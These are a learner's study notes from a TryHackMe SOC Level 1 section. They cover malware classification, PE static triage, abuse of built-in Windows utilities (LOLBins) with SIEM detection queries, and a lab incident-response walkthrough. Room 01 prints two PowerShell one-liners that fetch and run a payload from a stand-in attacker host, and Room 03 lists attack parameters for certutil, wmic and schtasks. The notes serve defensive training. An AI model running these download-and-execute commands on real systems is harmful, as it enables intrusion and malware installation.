# Section 11: Malware Concepts for SOC

**Platform:** TryHackMe  
**Path:** SOC Level 1  
**Status:** Completed  
**Rooms Completed:** 4/4  

---

# Overview

This section focused on fundamental malware concepts, classification, initial static and dynamic analysis methodologies, Living off the Land (LoL) techniques, and incident response triage. Through practical labs and simulated SOC scenarios, I learned how to categorize malicious software families, inspect Portable Executable (PE) headers, identify anti-analysis evasion tactics, construct SIEM detection rules for abused system binaries (LOLBins), and correlate endpoint telemetry during host breach investigations.

---

## Rooms Completed

- Malware Classification
- Intro to Malware Analysis
- Living Off the Land Attacks
- Shadow Trace

---

# Room 01: Malware Classification

## Objective

Understand primary malware categories, operational goals, and delivery vectors encountered during security monitoring, and differentiate compiled binary threats from obfuscated script-based payloads.

## Key Learning Points

### Malware Classifications & Behavioral Indicators

| Category | Primary Objective | Typical System / Network Behavior |
| :--- | :--- | :--- |
| **Adware** | Revenue generation via ads | Unsolicited pop-ups, browser redirection without data exfiltration. |
| **Spyware** | Stealth surveillance | Secretly monitors user activity, tracks locations, records audio/video. |
| **Ransomware** | Financial extortion | Bulk file encryption, shadow copy deletion, ransom note generation. |
| **Wiper** | Sabotage / Data destruction | Overwrites files with junk data or corrupts Master Boot Records (MBR). |
| **C2 / RAT** | Remote system control | Establishes persistent outbound connections to receive attacker commands. |
| **Data Stealer** | Information theft | Scrapes credentials, browser cookies, documents, and crypto wallets. |
| **Keylogger** | Input capture | Intercepts keystrokes, API hooks, and window titles to steal credentials. |
| **Cryptominer** | Resource hijacking | Causes sustained high CPU/GPU usage, system instability, and high fan speeds. |

### Real-World Threat Families

| Malware Family | Classification | Primary Tactic / Notable Feature |
| :--- | :--- | :--- |
| **Pegasus** | Spyware | Zero-click mobile exploits targeting iOS/Android for full device access. |
| **Akira** | Ransomware | Double-extortion model (data exfiltration combined with file encryption). |
| **Shamoon** | Wiper | Mass disk overwriting targeting critical infrastructure and energy networks. |
| **Agent Tesla** | Infostealer / Keylogger | Captures system logs, screenshots, and credentials via phishing vectors. |
| **RedLine Stealer** | Data Stealer / Keylogger | Extracts browser passwords, cookies, autofill data, and crypto wallets. |
| **QakBot** | Modular RAT / Loader | Banking trojan evolved into an initial-access loader for ransomware. |

### Binary vs. Script-Based Threat Comparison

| Characteristic | Binary Malware | Script-Based Malware |
| :--- | :--- | :--- |
| **Format** | Compiled machine code (`.exe`, `.dll`) | Plaintext / Obfuscated scripts (`.ps1`, `.vbs`, `.bat`, `.js`) |
| **Execution Model** | Native execution via OS binary loaders | Executed via interpreters (`powershell.exe`, `wscript.exe`, `cmd.exe`) |
| **Detection Basis** | File hashes (MD5/SHA256), static byte patterns | Behavioral indicators, AMSI scanning, command-line logging |
| **Payload Delivery** | File-based disk drop | In-memory execution (`Invoke-Expression`, `.NET` reflection) |

### Common Script Execution Syntax

```powershell
# File download and execution via batch/PowerShell wrapper
powershell -Command "Invoke-WebRequest [http://attacker.file/payload.exe](http://attacker.file/payload.exe) -OutFile C:\Users\Public\payload.exe"; start C:\Users\Public\payload.exe

# In-memory script execution avoiding disk writes
powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('[http://attacker.file/payload.ps1](http://attacker.file/payload.ps1)')"

```

## Practical Exercise

In this lab, I evaluated security alerts on a simulated SOC dashboard to categorize threat activity based on endpoint and network telemetry:

* Identified sustained high-CPU processes as **Cryptominers**.
* Mapped bulk file extension modifications and shadow copy deletions to **Ransomware**.
* Categorized unauthorized API hooking and credential scraping as **Keyloggers / Data Stealers**.
* Classified persistent outbound beaconing from fake system processes as **Trojan (RAT)** traffic.

## Skills Acquired

* Categorized malware types based on system impact and network signatures.
* Mapped active threat families to MITRE ATT&CK tactics (Collection, Exfiltration, Impact, C2).
* Compared compiled binary execution models against script-based in-memory execution.
* Triaged endpoint alerts based on resource metrics, process trees, and network beaconing.

## Interview Question

**Q: How do you distinguish between a Ransomware infection and a Wiper attack during initial triage?**

**A:** Ransomware encrypts user files using asymmetric/symmetric cryptography, deletes volume shadow copies, and leaves a ransom note containing payment instructions and key decryption contact details for financial gain. A Wiper corrupts data or the Master Boot Record (MBR) by overwriting sectors with junk data or zero-bytes with no intention or mechanism for recovery, aiming purely for sabotage or disruption.

## Key Takeaway

Functional malware classification enables SOC analysts to prioritize containment strategies—such as isolating cryptominers for resource protection versus immediately isolating ransomware hosts to stop lateral network propagation.

---

# Room 02: Intro to Malware Analysis

## Objective

Understand fundamental malware analysis methodologies, balance static and dynamic analysis, leverage automated sandboxing, dissect Portable Executable (PE) headers, and recognize anti-analysis evasion tactics.

## Key Learning Points

### Analysis Methodologies & Tools

| Analysis Type | Description | Core Indicators / Artifacts | Key Tools |
| --- | --- | --- | --- |
| **Basic Static** | Examining file characteristics without executing code. | File headers, metadata, strings, file hashes, imported APIs. | `file`, `strings`, `md5sum`, `pecheck`, `pe-tree` |
| **Basic Dynamic** | Executing samples in a controlled VM to observe behavior. | Process creation, registry changes, network traffic, file drops. | Sandboxes (CAPE, Any.run), Procmon, Wireshark |
| **Advanced Analysis** | Reversing compiled instructions or stepping through execution. | Assembly code, CPU registers, stack/heap memory states. | Disassemblers, Debuggers (GDB, x64dbg, IDA Pro) |

### PE Structure & Analysis Indicators

| PE Component | Functionality | SOC Triage Value |
| --- | --- | --- |
| **DOS Header** | Legacy compatibility layer | Contains the standard `This program cannot be run in DOS mode` stub. |
| **Import Table (`.rdata`)** | Dynamic libraries and functions loaded from OS | Identifies intended actions (e.g., `ADVAPI32.dll` for registry tweaks, `URLDownloadToFile` for secondary drops). |
| **`.text` Section** | Contains executable CPU instructions | High entropy (> 7.0) combined with write permissions usually indicates packed/encrypted code. |
| **`.rsrc` Section** | Application resources | Stores icons, dialog boxes, embedded binaries, or secondary encrypted payloads. |

### Anti-Analysis & Evasion Techniques

| Evasion Technique | Mechanism | Analyst Countermeasure |
| --- | --- | --- |
| **Packing & Obfuscation** | Encrypts/compresses code; strips standard strings and imports. | Perform manual or dynamic memory unpacking before static inspection. |
| **Long Sleep Calls** | Delays malicious actions to exceed standard sandbox execution limits. | Fast-forward system time or patch API sleep calls in a debugger. |
| **User Activity Detection** | Verifies mouse movements, keystrokes, or document history before firing. | Use interactive sandboxes or simulate realistic user behavior. |
| **VM/Hypervisor Detection** | Checks for specific virtualization artifacts (drivers, registry keys, MACs). | Harden VM configurations and disguise hypervisor-specific artifacts. |

### Essential Static Triage Commands

```bash
# Determine actual file type regardless of extension
file <filename>

# Extract ASCII and Unicode strings into a readable file
strings <filename> > extracted_strings.txt

# Calculate unique file hashes for threat intelligence lookups
md5sum <filename>
sha256sum <filename>

# Inspect PE header sections, entropy, and imported DLLs
pecheck <filename>

```

## Practical Exercise

In this practical lab, I performed initial static triage and automated sandbox evaluation on suspicious binary samples:

* **Hash Generation & Threat Intel Lookup:** Computed MD5 hashes using `md5sum` for samples (`wannacry`, `redline`) to execute reputation queries on VirusTotal and Hybrid Analysis.
* **PE Header Dissection:** Used `pecheck` to analyze section names, `.text` section entropy (6.45), and imported API functions, linking registry modification APIs (`RegOpenKeyExW`) to `ADVAPI32.dll`.
* **Sandbox Report Evaluation:** Reviewed Hybrid Analysis behavioral logs to trace process creation (`cmd.exe` shadow copy deletion), outbound C2 connections (8 domains contacted), and secondary file drops.
* **Packed Executable Identification:** Analyzed sample `zmsuz3pinwl`, identifying packing indicators such as missing `.text` section names, write/execute section permissions (`IMAGE_SCN_MEM_WRITE` + `IMAGE_SCN_MEM_EXECUTE`), high entropy (~7.97), and unreadable string output.

## Skills Acquired

* Extracted cryptographic file hashes for threat intelligence queries.
* Inspected Portable Executable (PE) header structures and section entropy.
* Evaluated automated sandbox behavioral reports and process execution trees.
* Recognized anti-analysis techniques, packing indicators, and VM detection mechanisms.

## Interview Question

**Q: What indicators in a Portable Executable (PE) header suggest that a file is packed or obfuscated?**

**A:** Key indicators include abnormally high entropy (> 7.0) in executable sections (indicating compressed or encrypted data), non-standard section names, section flags displaying both Write and Execute permissions (`IMAGE_SCN_MEM_WRITE` + `IMAGE_SCN_MEM_EXECUTE`), and a sparse Import Address Table (IAT) importing only basic system functions like `LoadLibrary` and `GetProcAddress`.

## Key Takeaway

Balancing static file inspection with automated dynamic sandboxing allows analysts to extract actionable IOCs quickly without exposing internal networks to unhandled execution risks.

---

# Room 03: Living Off the Land Attacks

## Objective

Understand Living off the Land (LoL) methodologies where adversaries abuse trusted, built-in system utilities (LOLBins) to execute code, persist, and move laterally while bypassing default security controls.

## Key Learning Points

### Common Windows LoL Binaries & Abuse Indicators

| Utility | Attack Vector / Capability | Red Flag Parameters & Execution Syntax |
| --- | --- | --- |
| **PowerShell** | Fileless in-memory execution, remote downloads | `-EncodedCommand`, `IEX`, `DownloadString`, `-Exec Bypass`, `-W Hidden` |
| **WMIC** | Remote execution, system reconnaissance | `/node:TARGETHOST process call create`, `process get Name,CommandLine` |
| **Certutil** | Payload downloading, base64 encoding/decoding | `-urlcache -split -f`, `-decode`, `-encode` |
| **Mshta** | Inline script execution, remote HTA execution | Remote HTTP/HTTPS links, `javascript:`, `.hta` file drops |
| **Rundll32** | Direct DLL export execution, URL protocol handling | Execution from `\Users\Public\` or `\Windows\Temp\`, `url.dll,FileProtocolHandler` |
| **schtasks** | Persistence across reboots, scheduled execution | `/Create /SC ONLOGON`, `/SC DAILY`, suspicious task names (`WindowsUpdate`) |

### Threat Group TTPs & Frameworks

* **LOLBAS / GTFOBins:** Reference repositories for Windows (LOLBAS) and Linux (GTFOBins) documenting native binary abuse vectors.
* **APT29 (Nobelium):** Uses WMI Event Subscriptions to store and execute encrypted PowerShell payloads.
* **BlackCat (ALPHV):** Abuses `certutil`, `psexec`, and PowerShell for remote execution and lateral movement.
* **QakBot / IcedID:** Uses `rundll32.exe` and `mshta.exe` to bootstrap secondary DLL payloads and Cobalt Strike beacons.

### SIEM Detection Rules (Splunk / Elastic)

```text
# PowerShell In-Memory & Encoded Downloads (Sysmon EID 1 / WinEventLog 4688, 4104)
(EventCode=1 OR EventCode=4104) (CommandLine="*powershell*IEX*" OR CommandLine="*-EncodedCommand*" OR CommandLine="*-Exec Bypass*" OR CommandLine="*DownloadString*")

# Certutil File Fetching & Decoding (Sysmon EID 1 / WinEventLog 4688)
Image="*\\certutil.exe" (CommandLine="* -urlcache * -f *" OR CommandLine="* -decode *")

# WMIC Remote Process Spawning (Sysmon EID 1 / WinEventLog 4688)
Image="*\\wmic.exe" (CommandLine="*process call create*" OR CommandLine="*/node:*")

# Scheduled Task Creation for Persistence (WinEventLog 4698 / Sysmon EID 1)
EventCode=4698 OR (Image="*\\schtasks.exe" CommandLine="* /Create*")

```

## Practical Exercise

In this lab, I evaluated raw Windows Event Logs and Sysmon telemetry to isolate full command-line parameters and detect LOLBin abuse:

* Identified fileless execution involving PowerShell `IEX (New-Object Net.WebClient).DownloadString` flags.
* Spotted payload staging using `certutil.exe -urlcache -split -f` dropping binaries into `C:\Users\Public\`.
* Tracked lateral movement commands executed via `wmic /node: process call create`.
* Classified persistent scheduled tasks created via `schtasks /Create /SC ONLOGON`.

## Skills Acquired

* Identified dual-use Windows binaries (LOLBins) used in fileless execution.
* Parsed command-line parameters for evasion flags (`-EncodedCommand`, `-urlcache`, `/node:`).
* Consulted LOLBAS and GTFOBins frameworks for behavioral indicators.
* Constructed SIEM detection rules targeting LOLBin abuse across Sysmon and Windows Event Logs.

## Interview Question

**Q: Why do adversaries prefer Living off the Land (LoL) binaries over dropping custom malware binaries?**

**A:** LoL binaries (LOLBins) are digitally signed, trusted operating system utilities that are already present on the target host. Using them allows adversaries to bypass application control and antivirus solutions, blend in with legitimate administrative activity, and execute fileless payloads directly in memory without leaving traditional disk artifacts.

## Key Takeaway

Detecting LoL attacks requires monitoring full command-line arguments and parent-child process relationships rather than relying on binary file path or signature reputation.

---

# Room 04: Shadow Trace

## Objective

Perform an incident response triage scenario on a suspicious binary (`windows-update.exe`) disguised as a legitimate system updater, extracting static artifacts, Base64 IOCs, and correlating EDR process alerts.

## Key Learning Points

### Binary Artifacts & Static Triage

| Property / Feature | Extracted Indicator / Value | SOC Triage Significance |
| --- | --- | --- |
| **File Target** | `windows-update.exe` | Impersonates legitimate Windows system updater binaries. |
| **Architecture** | 64-bit | Determines sandbox environment target compatibility. |
| **SHA-256 Hash** | `b2a88de3e3bcfae4a4b38fa36e884c586b5cb2c2c283e71fba59efdb9ea64bfc` | Primary cryptographic indicator for threat intelligence queries. |
| **Network Library** | `WS2_32.dll` | Indicates underlying Windows Socket API support for network connections. |
| **Embedded C2 URL** | `http://tryhatme.com/update/security-update.exe` | Direct payload delivery URL embedded within the executable. |
| **Suspicious Domain** | `responses.tryhatme.com` | Identified domain used for external C2 communication. |

### EDR Alert Analysis & Process Correlation

| Triggering Process | Observed Payload / Command Vector | Extracted IOC / Artifact |
| --- | --- | --- |
| **`powershell.exe`** | Base64-encoded script download using `System.Net.WebClient` executed via `IEX` | `https://tryhatme.com/dev/main.exe` |
| **`chrome.exe`** | Browser download alert fetching an external executable payload | `https://reallysecureupdate.tryhatme.com/update.exe` |

### Command-Line Extraction Commands

```powershell
# Extract embedded ASCII/Unicode strings filtering for target domain patterns
strings .\windows-update.exe | findstr "tryhatme"

# Compute SHA-256 hash for binary identification
Get-FileHash -Algorithm SHA256 .\windows-update.exe

```

## Practical Exercise

In this incident response lab, I executed static analysis and EDR log correlation on target host artifacts:

* **Static Binary Triage:** Analyzed `windows-update.exe` using command-line utilities, confirming 64-bit architecture, calculating its SHA-256 hash, and verifying socket network dependencies (`WS2_32.dll`).
* **String & IOC Extraction:** Dissected executable strings to locate embedded C2 payload paths (`http://tryhatme.com/update/security-update.exe`) and extracted the domain `responses.tryhatme.com`.
* **Payload Decoding:** Decoded an embedded Base64 string from the domain payload to retrieve the obfuscated script payload.
* **EDR Alert Correlation:** Evaluated process execution logs to unmask dual delivery vectors:
* Decoded a Base64-encoded PowerShell string initiating an in-memory download from `https://tryhatme.com/dev/main.exe`.
* Correlated an alert triggered by `chrome.exe` downloading a payload from `https://reallysecureupdate.tryhatme.com/update.exe`.



## Skills Acquired

* Executed static triage on suspicious Windows executables.
* Calculated cryptographic hashes and extracted PE import dependencies.
* Decoded Base64-encoded command-line payloads and embedded URLs.
* Correlated endpoint EDR alerts with process execution trees.

## Interview Question

**Q: How do you verify if a binary named `windows-update.exe` is legitimate or a masqueraded threat during an investigation?**

**A:** Verify the binary's digital signature (Authenticode), check its execution file path (legitimate Windows updates execute from `C:\Windows\System32\` or `C:\Windows\WinSxS\`, not user directories), compute its SHA-256 hash for threat intelligence queries, inspect PE header properties, and analyze parent-child process relationships (e.g., whether it was spawned by `trustedinstaller.exe` or an unverified browser process).

## Key Takeaway

Correlating endpoint process alerts with static artifact indicators allows incident responders to reconstruct dual delivery vectors and map out complete adversary infrastructure.

---

# 📊 Section 11 Summary

## Topics Covered

* Functional Malware Categorization (Adware, Spyware, Ransomware, Wiper, RAT, Stealer, Keylogger, Cryptominer)
* Real-World Malware Families (Pegasus, Akira, Shamoon, Agent Tesla, RedLine, QakBot)
* Compiled Binary vs. Script-Based Threat Comparison
* Basic Static & Dynamic Malware Analysis Methodologies
* Portable Executable (PE) Structure & Import Address Table (IAT) Inspection
* Anti-Analysis & Evasion Techniques (Packing, Long Sleep, VM Detection)
* Living off the Land (LoL) Attacks & LOLBins (`PowerShell`, `WMIC`, `Certutil`, `Mshta`, `Rundll32`, `schtasks`)
* SIEM Behavioral Rule Construction (Splunk / Elastic)
* Static Artifact Extraction (`strings`, `Get-FileHash`, `pecheck`)
* Base64 Payload Decoding & EDR Process Alert Correlation

---

## Key Terms Learned

* Ransomware vs. Wiper
* Remote Access Trojan (RAT)
* Infostealer
* Basic Static Analysis vs. Dynamic Analysis
* Portable Executable (PE)
* Section Entropy
* Packing / Obfuscation
* Import Address Table (IAT)
* Living off the Land (LoL) / LOLBin
* LOLBAS / GTFOBins
* In-Memory Execution
* EDR Alert Correlation

---

## Skills Acquired

* Categorized malware samples based on endpoint telemetry and network behavior.
* Computed file hashes (MD5, SHA-256) and extracted PE header structures and entropy.
* Identified anti-analysis techniques, packing indicators, and sandbox evasion mechanisms.
* Constructed SIEM queries targeting LOLBin command-line parameters.
* Decoded obfuscated Base64 scripts and extracted embedded C2 domain IOCs.
* Correlated EDR process trees across browser downloads and scripting interpreters.

---

## Personal Reflection

This section connected offensive malware concepts directly to defensive SOC triage and incident response workflows. Understanding how malware families operate—and how adversaries abuse trusted operating system utilities (LOLBins) to execute code in memory—highlighted the necessity of command-line logging and behavioral monitoring. Mastering PE header inspection, static string extraction, and EDR alert correlation provided practical, hands-on capabilities for triaging suspicious endpoints, isolating threat infrastructure, and containing intrusions inside a Security Operations Center.

```

